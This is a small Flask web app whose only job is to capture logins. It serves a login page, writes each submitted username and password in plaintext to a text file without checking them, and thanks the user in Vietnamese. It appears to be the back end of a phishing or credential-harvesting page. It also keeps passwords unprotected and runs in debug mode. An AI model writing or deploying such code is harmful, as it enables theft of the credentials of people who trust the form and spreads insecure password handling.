from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/submit', methods=['POST'])
def handle_submission():
    username = request.form['username']
    password = request.form['password']
    with open('data.txt', 'a') as file:
        file.write(f'{username}:{password}\n')
    return "Cảm ơn bạn đã đăng nhập!"

if __name__ == "__main__":
    app.run(debug=True)